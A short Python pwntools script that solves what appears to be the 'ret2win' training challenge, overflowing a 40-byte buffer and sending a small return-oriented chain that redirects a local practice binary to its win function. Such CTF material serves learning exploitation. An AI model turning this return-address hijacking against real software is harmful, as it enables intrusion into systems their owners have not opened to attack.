from pwn import *

# ret2win() address can be found by calling nm ret2win | grep ' t '
ret2win = 0x400756
print(str(ret2win))
# RIP offset is at 40
pad = "A" * 40

# Call ret2win()
rop = bytes(pad, 'utf-8') + p64(0x400770) + p64(ret2win)
#rop += str(p64(ret2win)
print(str(rop))
#exit()
# Start process and send rop chain
e = process('ret2win')
print (e.recv())
e.sendline(rop)

# Print output of ret2win()
print (e.recvall())
